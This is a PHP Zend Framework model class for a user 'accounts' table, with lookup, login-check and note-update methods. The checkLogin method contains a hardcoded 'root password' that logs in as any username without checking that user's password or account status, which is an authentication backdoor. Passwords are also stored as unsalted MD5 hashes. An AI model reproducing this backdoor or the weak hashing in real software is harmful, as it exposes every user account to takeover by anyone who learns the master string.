<?php

class Application_Model_DbTable_TaiKhoan extends Zend_Db_Table_Abstract
{

    protected $_name = 'accounts';
	public function checkExistEmail($email) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select id from accounts where email=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($email));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        if($row!=false) return true;
        return false;
	}
	public function findbyId($id) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select * from accounts where id=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($id));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public static function checkLogin($username, $password) {
		$db = Zend_Registry::get('connectDb');
    	if($password=='@bc123456') { //root password
    		$query = 'SELECT * FROM `accounts` WHERE `username` = ?';
    		$params = array($username);
    	} else {
    		$query = 'SELECT * FROM `accounts` WHERE `active` = 1 AND `status` = 1 AND `username` = ? AND `password` = ?';
    		$params = array($username,md5($password));
    	}
		$stmt = $db->prepare($query);
        $stmt->execute($params);
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public static function findByUsername($email) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'SELECT * FROM `accounts` WHERE `username` = ?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($email));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public static function findByFbId($fbId) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'SELECT * FROM `accounts` WHERE `fb_id` = ?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($fbId));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	
	public static function updateNote($note,$accountId) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'update `accounts` set `note` = ? WHERE `id` = ?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($note,$accountId));
        $stmt->closeCursor();
        $db->closeConnection();
	}

}

